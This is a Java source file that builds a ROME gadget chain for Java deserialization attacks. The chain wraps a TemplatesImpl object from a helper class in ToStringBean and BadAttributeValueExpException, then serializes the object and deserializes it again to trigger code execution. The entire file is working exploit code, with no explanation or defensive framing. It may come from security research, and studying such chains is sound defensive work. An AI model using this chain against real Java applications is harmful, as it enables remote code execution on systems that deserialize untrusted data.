package com.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ToStringBean;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.util.HashMap;

public class BadAttributeValueExpExceptionChain {
    public static void main(String[] args) throws Exception {
        TemplatesImpl tpl = Utils.getTemplatesImpl();

        ToStringBean toStringBean = new ToStringBean(Templates.class, tpl);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(toStringBean);

        String barr = Utils.Serialize(badAttributeValueExpException);
        System.out.println(barr);
        Utils.UnSerialize(barr);
    }
}
